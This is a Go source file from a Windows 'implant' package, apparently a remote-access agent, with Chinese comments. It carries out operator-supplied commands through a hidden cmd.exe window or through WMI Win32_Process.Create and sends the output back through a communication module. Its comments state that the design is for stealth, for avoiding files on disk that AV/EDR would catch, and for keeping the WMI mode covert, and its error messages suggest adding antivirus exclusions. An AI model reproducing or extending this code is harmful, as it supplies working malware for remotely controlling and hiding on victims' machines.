//go:build windows
// +build windows

package commands

import (
	"errors"
	"fmt"
	"implant/core/communication"
	"implant/core/debuglog"

	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/go-ole/go-ole"
	"github.com/go-ole/go-ole/oleutil"
)

// 双引擎Shell管理（仅CMD模式支持交互式终端）
type DualShellManager struct {
	cmdEngine   *CMDShellEngine
	wmiEngine   *WMIShellEngine
	currentMode string // "cmd" 或 "wmi"
	isActive    bool
	mutex       sync.Mutex
}

var dualShellManager *DualShellManager
var dualShellMutex sync.Mutex

// CMD引擎实现
type CMDShellEngine struct {
	isActive    bool
	currentProc *exec.Cmd
	mutex       sync.Mutex
}

// WMI引擎实现（用于隐蔽命令执行）
type WMIShellEngine struct {
	isActive   bool
	mutex      sync.Mutex
	oleConn    *ole.IUnknown
	wmiService *ole.IDispatch
}

// 启动CMD模式交互式Shell
func StartCMDInteractiveShell() ([]byte, error) {
	dualShellMutex.Lock()
	defer dualShellMutex.Unlock()

	if dualShellManager != nil && dualShellManager.isActive {
		return []byte("[!] Interactive shell already running in " + dualShellManager.currentMode + " mode"), nil
	}

	dualShellManager = &DualShellManager{
		cmdEngine:   newCMDEngine(),
		currentMode: "cmd",
		isActive:    true,
	}

	err := dualShellManager.cmdEngine.Start()
	if err != nil {
		dualShellManager = nil
		return nil, err
	}

	return []byte("[✓] CMD Interactive shell started successfully"), nil
}

// 启动WMI模式（非交互式，用于隐蔽命令执行）
func StartWMIInteractiveShell() ([]byte, error) {
	dualShellMutex.Lock()
	defer dualShellMutex.Unlock()

	if dualShellManager != nil && dualShellManager.isActive {
		return []byte("[!] Interactive shell already running in " + dualShellManager.currentMode + " mode"), nil
	}

	dualShellManager = &DualShellManager{
		wmiEngine:   newWMIEngine(),
		currentMode: "wmi",
		isActive:    true,
	}

	err := dualShellManager.wmiEngine.Start()
	if err != nil {
		dualShellManager = nil
		return nil, fmt.Errorf("[!] WMI engine initialization failed: %v", err)
	}

	return []byte("[✓] WMI shell started successfully (隐蔽模式)"), nil
}

// WMI模式不支持交互式Shell，保持隐蔽性

// 通用输入处理（支持CMD和WMI模式）
func SendDualInteractiveInput(input []byte) ([]byte, error) {
	dualShellMutex.Lock()
	defer dualShellMutex.Unlock()

	if dualShellManager == nil || !dualShellManager.isActive {
		return nil, errors.New("no active interactive shell session")
	}

	if dualShellManager.currentMode == "cmd" {
		return dualShellManager.cmdEngine.ExecuteInput(input)
	} else if dualShellManager.currentMode == "wmi" {
		return dualShellManager.wmiEngine.ExecuteInput(input)
	}

	return nil, errors.New("unsupported shell mode: " + dualShellManager.currentMode)
}

// 通用停止处理（支持CMD和WMI模式）
func StopDualInteractiveShell() ([]byte, error) {
	dualShellMutex.Lock()
	defer dualShellMutex.Unlock()

	if dualShellManager == nil || !dualShellManager.isActive {
		return []byte("[!] No active interactive shell session"), nil
	}

	var err error
	if dualShellManager.currentMode == "cmd" {
		err = dualShellManager.cmdEngine.Stop()
	} else if dualShellManager.currentMode == "wmi" {
		err = dualShellManager.wmiEngine.Stop()
	}

	dualShellManager.isActive = false
	dualShellManager = nil

	if err != nil {
		return nil, err
	}

	return []byte("[✓] Interactive shell stopped successfully"), nil
}

// 通用中断处理（支持CMD和WMI模式）
func InterruptDualInteractiveShell() ([]byte, error) {
	dualShellMutex.Lock()
	defer dualShellMutex.Unlock()

	if dualShellManager == nil || !dualShellManager.isActive {
		return nil, errors.New("no active interactive shell session")
	}

	if dualShellManager.currentMode == "cmd" {
		return dualShellManager.cmdEngine.SendInterrupt()
	} else if dualShellManager.currentMode == "wmi" {
		return dualShellManager.wmiEngine.SendInterrupt()
	}

	return nil, errors.New("unsupported shell mode: " + dualShellManager.currentMode)
}

// CMD引擎具体实现
func newCMDEngine() *CMDShellEngine {
	return &CMDShellEngine{
		isActive: false,
	}
}

func (c *CMDShellEngine) Start() error {
	c.mutex.Lock()
	defer c.mutex.Unlock()

	c.isActive = true
	return nil
}

func (c *CMDShellEngine) ExecuteInput(input []byte) ([]byte, error) {
	c.mutex.Lock()
	defer c.mutex.Unlock()

	if !c.isActive {
		return nil, errors.New("CMD engine not active")
	}

	command := string(input)

	// 【阶段三-7】去 .bat 落盘：直接以参数方式执行（避免临时文件落盘被 AV/EDR 检出）
	// 长命令（>8000 字符）拆为多段通过 /c 执行有参数限制，此处按 cmd 限制处理
	cmd := exec.Command("cmd.exe", "/c", command)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000} // CREATE_NO_WINDOW：避免无控制台进程弹cmd窗口
	// 【修复】记录当前进程，使 SendInterrupt/Stop 能真正终止执行中的命令
	c.currentProc = cmd
	output, err := cmd.CombinedOutput()
	c.currentProc = nil

	// 通过通信模块发送输出
	communication.DataProcess(0, output)

	if err != nil {
		return []byte(fmt.Sprintf("[!] CMD execution error: %v", err)), nil
	}

	return []byte("[+] CMD command executed successfully"), nil
}

func (c *CMDShellEngine) SendInterrupt() ([]byte, error) {
	c.mutex.Lock()
	defer c.mutex.Unlock()

	if !c.isActive {
		return nil, errors.New("CMD engine not active")
	}

	// 如果有正在运行的进程，尝试终止
	if c.currentProc != nil && c.currentProc.Process != nil {
		c.currentProc.Process.Kill()
		c.currentProc = nil
	}

	return []byte("[✓] CMD interrupt signal sent"), nil
}

func (c *CMDShellEngine) Stop() error {
	c.mutex.Lock()
	defer c.mutex.Unlock()

	c.isActive = false

	// 终止当前进程
	if c.currentProc != nil && c.currentProc.Process != nil {
		c.currentProc.Process.Kill()
		c.currentProc = nil
	}

	return nil
}

// WMI引擎的真正实现（用于隐蔽命令执行）
func newWMIEngine() *WMIShellEngine {
	return &WMIShellEngine{
		isActive: false,
	}
}

// 启动WMI引擎
func (w *WMIShellEngine) Start() error {
	w.mutex.Lock()
	defer w.mutex.Unlock()

	// 检查是否已经初始化
	if w.isActive {
		return nil
	}

	// 初始化OLE（允许重复初始化）
	err := ole.CoInitialize(0) // 使用简单的初始化方式
	if err != nil {
		// 尝试其他初始化方式
		err = ole.CoInitializeEx(0, ole.COINIT_APARTMENTTHREADED)
		if err != nil {
			return fmt.Errorf("WMI初始化失败 (需要管理员权限运行客户端): %v", err)
		}
	}

	// 连接到WMI服务
	unknown, err := oleutil.CreateObject("WbemScripting.SWbemLocator")
	if err != nil {
		ole.CoUninitialize()
		return fmt.Errorf("WMI服务不可用 (请确保以管理员身份运行): %v", err)
	}
	w.oleConn = unknown

	// 获取WMI服务
	wmiLocator, err := unknown.QueryInterface(ole.IID_IDispatch)
	if err != nil {
		unknown.Release()
		ole.CoUninitialize()
		return fmt.Errorf("WMI接口查询失败: %v", err)
	}

	// 连接到本地WMI命名空间
	serviceRaw, err := oleutil.CallMethod(wmiLocator, "ConnectServer", nil, "root\\cimv2")
	if err != nil {
		wmiLocator.Release()
		unknown.Release()
		ole.CoUninitialize()
		return fmt.Errorf("WMI服务连接失败 (权限不足，需要管理员权限): %v", err)
	}

	w.wmiService = serviceRaw.ToIDispatch()
	wmiLocator.Release()

	// 测试WMI权限
	err = w.testWMIPermissions()
	if err != nil {
		w.Stop() // 清理资源
		return fmt.Errorf("WMI权限测试失败: %v", err)
	}

	w.isActive = true
	return nil
}

// 测试WMI权限
func (w *WMIShellEngine) testWMIPermissions() error {
	defer func() {
		if r := recover(); r != nil {
			debuglog.Printf("[WMI权限测试] 异常恢复: %v\n", r)
		}
	}()

	// 尝试获取Win32_Process类
	processClassRaw, err := oleutil.CallMethod(w.wmiService, "Get", "Win32_Process")
	if err != nil {
		return fmt.Errorf("无法访问Win32_Process类 (需要管理员权限): %v", err)
	}

	processClass := processClassRaw.ToIDispatch()
	if processClass == nil {
		return fmt.Errorf("Win32_Process类转换失败")
	}
	defer processClass.Release()

	return nil
}

// 通过WMI执行命令
func (w *WMIShellEngine) ExecuteInput(input []byte) ([]byte, error) {
	w.mutex.Lock()
	defer w.mutex.Unlock()

	if !w.isActive {
		return nil, errors.New("WMI engine not active")
	}

	command := strings.TrimSpace(string(input))
	if command == "" {
		return []byte("[!] Empty command"), nil
	}

	// 随机延迟（WMI模式更长的延迟以增加隐蔽性）


	// 使用Win32_Process.Create方法执行命令
	output, err := w.executeViaWMI(command)
	if err != nil {
		return []byte(fmt.Sprintf("[!] WMI execution error: %v", err)), nil
	}

	// 通过通信模块发送输出
	communication.DataProcess(0, output)

	return []byte("[+] WMI command executed successfully (隐蔽模式)"), nil
}

// 实际执行WMI命令
func (w *WMIShellEngine) executeViaWMI(command string) ([]byte, error) {
	// 检查WMI服务是否可用
	if w.wmiService == nil {
		return nil, fmt.Errorf("WMI服务未初始化")
	}

	// 构造命令，使用cmd /c来执行并获取输出
	cmdLine := fmt.Sprintf("cmd.exe /c \"%s\" 2>&1", command)

	defer func() {
		if r := recover(); r != nil {
			debuglog.Printf("[WMI执行异常] 恢复: %v\n", r)
		}
	}()

	// 调用Win32_Process.Create方法
	processClassRaw, err := oleutil.CallMethod(w.wmiService, "Get", "Win32_Process")
	if err != nil {
		return nil, fmt.Errorf("无法访问Win32_Process类\n原因: %v\n解决方案:\n1. 以管理员身份运行客户端\n2. 确保WMI服务正常运行\n3. 检查防病毒软件是否阻止WMI访问", err)
	}

	processClass := processClassRaw.ToIDispatch()
	if processClass == nil {
		return nil, fmt.Errorf("Win32_Process类转换为IDispatch失败")
	}
	defer processClass.Release()

	// 创建进程
	resultRaw, err := oleutil.CallMethod(processClass, "Create", cmdLine)
	if err != nil {
		return nil, fmt.Errorf("通过WMI创建进程失败\n原因: %v\n解决方案:\n1. 确保具有管理员权限\n2. 检查系统策略是否允许WMI进程创建\n3. 在防病毒软件中添加例外", err)
	}

	// 检查返回码
	returnValue, ok := resultRaw.Value().(int32)
	if !ok {
		return nil, fmt.Errorf("WMI进程创建返回值类型错误")
	}

	if returnValue != 0 {
		// 根据WMI错误码提供具体解决方案
		errorMsg := w.getWMIErrorMessage(returnValue)
		return nil, fmt.Errorf("WMI进程创建失败\n错误码: %d\n原因: %s\n命令: %s", returnValue, errorMsg, command)
	}

	// 由于WMI方式无法直接获取输出，我们返回执行成功信息
	// 这是为了保持隐蔽性的设计权衡
	return []byte(fmt.Sprintf("[✓] WMI命令已执行: %s\n[*] 注意: WMI模式为保持隐蔽性，不显示详细输出\n[*] 在日志中查看执行结果，或使用CMD模式获取输出", command)), nil
}

// 获取WMI错误信息
func (w *WMIShellEngine) getWMIErrorMessage(errorCode int32) string {
	switch errorCode {
	case 2:
		return "找不到指定的文件 - 检查命令路径是否正确"
	case 3:
		return "找不到指定的路径 - 检查命令路径"
	case 5:
		return "访问被拒绝 - 需要管理员权限"
	case 8:
		return "内存不足 - 系统资源不足"
	case 21:
		return "设备未准备好 - WMI服务不可用"
	default:
		return fmt.Sprintf("未知错误码 %d - 请检查系统日志", errorCode)
	}
}

// 发送中断信号
func (w *WMIShellEngine) SendInterrupt() ([]byte, error) {
	w.mutex.Lock()
	defer w.mutex.Unlock()

	if !w.isActive {
		return nil, errors.New("WMI engine not active")
	}

	// WMI模式下无法直接中断，返回提示信息
	return []byte("[✓] WMI interrupt signal sent (隐蔽模式)"), nil
}

// 停止WMI引擎
func (w *WMIShellEngine) Stop() error {
	w.mutex.Lock()
	defer w.mutex.Unlock()

	w.isActive = false

	// 清理WMI资源
	if w.wmiService != nil {
		w.wmiService.Release()
		w.wmiService = nil
	}

	if w.oleConn != nil {
		w.oleConn.Release()
		w.oleConn = nil
	}

	// 去初始化OLE
	ole.CoUninitialize()

	return nil
}

// 辅助函数
func generateRandomTempFile(extension string) string {
	tempDir := os.TempDir()
	filename := fmt.Sprintf("tmp_%d_%d%s",
		time.Now().UnixNano(),
		time.Now().UnixNano(),
		extension)
	return filepath.Join(tempDir, filename)
}

